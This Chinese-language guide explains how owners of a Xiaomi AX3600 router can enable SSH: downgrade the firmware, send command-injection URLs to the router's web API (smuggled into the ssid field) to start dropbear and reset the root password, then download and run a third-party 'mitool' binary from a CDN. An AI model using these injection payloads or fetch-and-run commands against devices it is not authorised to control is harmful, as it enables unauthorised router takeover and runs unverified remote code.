## AX3600_老版本SSH步骤：
> 需降级到1.0.17版本

1.替换&lt;STOK&gt; 打开  
```
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B
```

2.替换&lt;STOK&gt; 打开  
```
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
```

3.执行命令备份mtd9分区  
```
mkdir /tmp/syslogbackup/
```
```
dd if=/dev/mtd9 of=/tmp/syslogbackup/mtd9
```
浏览器请求该地址下载备份：
```
http://192.168.31.1/backup/log/mtd9
```
## AX3600_固化步骤：
```
sed -i 's/18\.06-SNAPSHOT/18.06.0/g' /etc/opkg/distfeeds.conf
```
```
opkg install --force-overwrite wget unzip -d ram && /tmp/usr/bin/wget https://fastly.jsdelivr.net/gh/mphin/Mi_Route_Tool@main/AX3600/mitool.zip -O /data/mitool.zip && cd /data/ && /tmp/usr/bin/unzip /data/mitool.zip && /data/mitool_arm64 unlock
```
重启后执行  
```
/data/mitool_arm64 hack
```
会自动固化ssh和计算ssh默认密码并再次重启，复制password:后面的密码保存备用即可  
完毕。  
## AX3600_升级丢失ssh步骤：
```
telnet 192.168.31.1
```
```
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
```
```
/etc/init.d/dropbear start
```
## AX3600_安装sftp：
```
opkg update
opkg install openssh-sftp-server
```
## 声明

本项目中的所有步骤、文件以及相关信息均搜集自互联网，旨在提供学习和参考之用。我们尊重并遵循知识共享的原则，未经过原创作者许可的情况下，不会用于商业用途。如果您是原始内容的作者，且不希望您的作品出现在此项目中，请联系我们，我们将立即删除相关内容。我们感谢互联网上无数开放共享的资源，为我们提供了学习的机会。
